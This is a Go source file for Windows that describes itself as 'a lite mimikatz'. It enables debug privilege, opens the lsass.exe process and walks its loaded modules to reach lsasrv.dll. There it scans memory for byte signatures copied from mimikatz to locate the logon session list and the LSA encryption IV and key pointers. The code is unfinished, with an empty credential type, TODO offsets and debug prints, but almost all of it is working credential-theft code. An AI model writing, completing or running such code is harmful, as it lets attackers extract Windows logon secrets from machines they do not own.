// +build windows

package kiwi

import (
	"bytes"
	"fmt"
	"reflect"
	"sort"
	"sync"
	"unicode/utf16"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/convert"
	"project/internal/logger"
	"project/internal/module/windows/api"
	"project/internal/module/windows/privilege"
	"project/internal/random"
)

// Credential contain information.
type Credential struct {
}

// Kiwi is a lite mimikatz.
type Kiwi struct {
	logger logger.Logger

	rand *random.Rand

	// privilege
	debug bool

	// 0 = not read, 1 = true, 2 = false
	wow64 uint8

	// resource about lsass.exe
	pid     uint32
	modules []*basicModuleInfo

	// about Windows version
	major uint32
	minor uint32
	build uint32

	mu sync.Mutex
}

// NewKiwi is used to create a new kiwi.
func NewKiwi(logger logger.Logger) *Kiwi {
	return &Kiwi{
		logger: logger,
		rand:   random.NewRand(),
	}
}

func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
	kiwi.logger.Println(lv, "kiwi", log...)
}

func (kiwi *Kiwi) logf(lv logger.Level, format string, log ...interface{}) {
	kiwi.logger.Printf(lv, "kiwi", format, log...)
}

// EnableDebugPrivilege is used to enable debug privilege.
func (kiwi *Kiwi) EnableDebugPrivilege() error {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.debug {
		return nil
	}
	err := privilege.EnableDebugPrivilege()
	if err != nil {
		return err
	}
	kiwi.debug = true
	return nil
}

// GetAllCredential is used to get all credentials from lsass.exe memory.
func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
	// check is running on WOW64
	wow64, err := kiwi.isWow64()
	if err != nil {
		return nil, err
	}
	if wow64 {
		return nil, errors.New("can't access x64 process")
	}
	pid, err := kiwi.getLSASSProcessID()
	if err != nil {
		return nil, err
	}
	pHandle, err := kiwi.getLSASSHandle(pid)
	if err != nil {
		return nil, err
	}
	defer api.CloseHandle(pHandle)
	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
	modules, err := kiwi.getLSASSBasicModuleInfo(pHandle)
	if err != nil {
		return nil, err
	}
	for _, module := range modules {
		if module.name == "lsasrv.dll" {
			_ = kiwi.searchMemory(pHandle, module.address, module.size)
		}
		// fmt.Println(module.name, module.address)
	}
	return nil, nil
}

func (kiwi *Kiwi) isWow64() (bool, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.wow64 != 0 {
		return kiwi.wow64 == 1, nil
	}
	var wow64 bool
	err := windows.IsWow64Process(windows.CurrentProcess(), &wow64)
	if err != nil {
		return false, errors.Wrap(err, "failed to call IsWow64Process")
	}
	if wow64 {
		kiwi.wow64 = 1
	} else {
		kiwi.wow64 = 2
	}
	return wow64, nil
}

func (kiwi *Kiwi) getLSASSProcessID() (uint32, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.pid != 0 {
		return kiwi.pid, nil
	}
	pid, err := api.GetProcessIDByName("lsass.exe")
	if err != nil {
		return 0, err
	}
	defer func() {
		kiwi.logf(logger.Info, "PID of lsass.exe is %d", kiwi.pid)
	}()
	l := len(pid)
	if l == 1 {
		kiwi.pid = pid[0]
		return kiwi.pid, nil
	}
	// if appear multi PID, select minimize
	ps := make([]int, l)
	for i := 0; i < l; i++ {
		ps[i] = int(pid[i])
	}
	sort.Ints(ps)
	kiwi.pid = uint32(ps[0])
	return kiwi.pid, nil
}

func (kiwi *Kiwi) getWindowsVersion() (major, minor, build uint32) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if kiwi.major == 0 {
		kiwi.major, kiwi.minor, kiwi.build = api.GetVersionNumber()
	}
	return kiwi.major, kiwi.minor, kiwi.build
}

func (kiwi *Kiwi) getLSASSHandle(pid uint32) (windows.Handle, error) {
	major, _, _ := kiwi.getWindowsVersion()
	var da uint32 = windows.PROCESS_VM_READ
	if major < 6 {
		da |= windows.PROCESS_QUERY_INFORMATION
	} else {
		da |= windows.PROCESS_QUERY_LIMITED_INFORMATION
	}
	return api.OpenProcess(da, false, pid)
}

type basicModuleInfo struct {
	name    string
	address uintptr
	size    int
}

func (kiwi *Kiwi) getVeryBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
	const paddingSize = 256 + 512

	// read PEB base address
	var pbi api.ProcessBasicInformation
	ic := api.InfoClassProcessBasicInformation
	_, err := api.NTQueryInformationProcess(pHandle, ic, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi))
	if err != nil {
		return nil, err
	}
	kiwi.logf(logger.Debug, "PEB base address is 0x%X", pbi.PEBBaseAddress)

	// read PEB
	var peb struct {
		api.PEB
		padding [paddingSize]byte
	}
	size := unsafe.Sizeof(peb.PEB) + uintptr(256+kiwi.rand.Int(512))
	_, err = api.ReadProcessMemory(pHandle, pbi.PEBBaseAddress, uintptr(unsafe.Pointer(&peb)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read PEB structure")
	}
	kiwi.logf(logger.Debug, "loader data address is 0x%X", peb.LoaderData)

	// read loader data
	var loaderData struct {
		api.PEBLDRData
		padding [paddingSize]byte
	}
	size = unsafe.Sizeof(loaderData.PEBLDRData) + uintptr(256+kiwi.rand.Int(512))
	_, err = api.ReadProcessMemory(pHandle, peb.LoaderData, uintptr(unsafe.Pointer(&loaderData)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read PEB loader data")
	}

	// read loader data table entry
	offset := unsafe.Offsetof(api.LDRDataTableEntry{}.InMemoryOrderLinks)
	begin := uintptr(unsafe.Pointer(loaderData.InMemoryOrderModuleVector.Flink)) - offset
	end := peb.LoaderData + unsafe.Offsetof(api.PEBLDRData{}.InLoadOrderModuleVector)
	kiwi.logf(logger.Debug, "read loader data table entry, begin: 0x%X, end: 0x%X", begin, end)
	var modules []*basicModuleInfo
	var ldrEntry struct {
		api.LDRDataTableEntry
		padding [paddingSize]byte
	}
	for addr := begin; addr < end; addr = uintptr(unsafe.Pointer(ldrEntry.InMemoryOrderLinks.Flink)) - offset {
		size = unsafe.Sizeof(ldrEntry.LDRDataTableEntry) + uintptr(256+kiwi.rand.Int(512))
		_, err = api.ReadProcessMemory(pHandle, addr, uintptr(unsafe.Pointer(&ldrEntry)), size)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read loader data table entry")
		}
		// read base dll name
		bufAddr := ldrEntry.BaseDLLName.Buffer
		size = uintptr(ldrEntry.BaseDLLName.MaximumLength)
		baseDLLName := make([]byte, int(size)+256+kiwi.rand.Int(512))
		_, err = api.ReadProcessMemory(pHandle, bufAddr, uintptr(unsafe.Pointer(&baseDLLName[0])), size)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read base dll name")
		}
		// make string
		var utf16Str []uint16
		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
		sh.Len = int(ldrEntry.BaseDLLName.Length / 2)
		sh.Cap = int(ldrEntry.BaseDLLName.Length / 2)
		sh.Data = uintptr(unsafe.Pointer(&baseDLLName[:ldrEntry.BaseDLLName.Length][0]))
		// add module
		modules = append(modules, &basicModuleInfo{
			name:    string(utf16.Decode(utf16Str)),
			address: ldrEntry.DLLBase,
			size:    int(ldrEntry.SizeOfImage),
		})
	}
	kiwi.log(logger.Debug, "loaded module count:", len(modules))
	return modules, nil
}

func (kiwi *Kiwi) getLSASSBasicModuleInfo(pHandle windows.Handle) ([]*basicModuleInfo, error) {
	kiwi.mu.Lock()
	defer kiwi.mu.Unlock()
	if len(kiwi.modules) != 0 {
		return kiwi.modules, nil
	}
	var err error
	kiwi.modules, err = kiwi.getVeryBasicModuleInfo(pHandle)
	if err != nil {
		return nil, err
	}
	kiwi.log(logger.Info, "load module information about lsass.exe successfully")
	return kiwi.modules, nil
}

var (
	win6xLogonSessionList = []byte{0x33, 0xFF, 0x41, 0x89, 0x37, 0x4C, 0x8B, 0xF3, 0x45, 0x85, 0xC0, 0x74}

	win10LSAInitializeProtectedMemoryKey = []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8D,
		0x45, 0xE0, 0x44, 0x8B, 0x4D, 0xD8, 0x48, 0x8D, 0x15} // 67, -89, 16
)

type bcryptHandleKey struct {
	size       uint32
	tag        uint32 // R U U U
	hAlgorithm uintptr
	key        uintptr // bcryptKey
	unk0       uintptr
}

type bcryptKey81 struct {
	size    uint32
	tag     uint32 // K S S M
	typ     uint32
	unk0    uint32
	unk1    uint32
	unk2    uint32
	unk3    uint32
	unk4    uint32
	unk5    uintptr // before, align in x64
	unk6    uint32
	unk7    uint32
	unk8    uint32
	unk9    uint32
	hardKey hardKey
}

type hardKey struct {
	cbSecret uint32
	data     [4]byte // self append
}

func (kiwi *Kiwi) searchMemory(pHandle windows.Handle, address uintptr, length int) error {
	memory := make([]byte, length)
	_, err := api.ReadProcessMemory(pHandle, address, uintptr(unsafe.Pointer(&memory[0])), uintptr(length))
	if err != nil {
		return errors.WithMessage(err, "failed to search memory")
	}

	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0
	// /mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c

	index := bytes.Index(memory, win6xLogonSessionList)
	address1 := address + uintptr(index) + 23 // TODO 16 -> 23
	// lsass address
	var offset int32
	_, err = api.ReadProcessMemory(pHandle, address1, uintptr(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to search memory")
	}
	fmt.Printf("%X\n", address1)
	fmt.Println(offset)
	fmt.Println(convert.LEInt32ToBytes(offset))
	fmt.Println()

	genericPtr := address1 + 4 + uintptr(offset)

	fmt.Printf("%X\n", genericPtr)

	address1 = address + uintptr(index) - 4
	_, err = api.ReadProcessMemory(pHandle, address1, uintptr(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Printf("%X\n", address1)
	fmt.Println(offset)
	fmt.Println(convert.LEInt32ToBytes(offset))
	fmt.Println()

	genericPtr2 := address1 + 4 + uintptr(offset)
	fmt.Printf("%X\n", genericPtr2)

	// address1 += 4 + uintptr(offset64)

	index = bytes.Index(memory, win10LSAInitializeProtectedMemoryKey)

	// https://github.com/gentilkiwi/mimikatz/blob/fe4e98405589e96ed6de5e05ce3c872f8108c0a0/
	// mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c

	address2 := address + uintptr(index) + 67 // TODO off0
	fmt.Printf("%X\n", address2)

	var offset2 uint32
	_, err = api.ReadProcessMemory(pHandle, address2, uintptr(unsafe.Pointer(&offset2)), unsafe.Sizeof(offset2))
	if err != nil {
		return errors.WithMessage(err, "failed to read iv")
	}

	address2 += 4 + uintptr(offset2)
	fmt.Printf("%X\n", address2)

	iv := make([]byte, 16)
	_, err = api.ReadProcessMemory(pHandle, address2, uintptr(unsafe.Pointer(&iv[0])), uintptr(16))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Println(iv)

	address3 := address + uintptr(index) - 89 // TODO off1
	fmt.Printf("%X\n", address3)

	var offset3 int32
	_, err = api.ReadProcessMemory(pHandle, address3, uintptr(unsafe.Pointer(&offset3)), unsafe.Sizeof(offset3))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Println(convert.LEInt32ToBytes(offset3))

	address3 += 4 + uintptr(offset3)
	var pointer1 uintptr
	_, err = api.ReadProcessMemory(pHandle, address3, uintptr(unsafe.Pointer(&pointer1)), unsafe.Sizeof(pointer1))
	if err != nil {
		return errors.WithMessage(err, "failed to search iv")
	}
	fmt.Printf("%X\n", pointer1)

	return nil
}

// 33 ff 41 89 37 4c 8b f3 45 85 c0 74
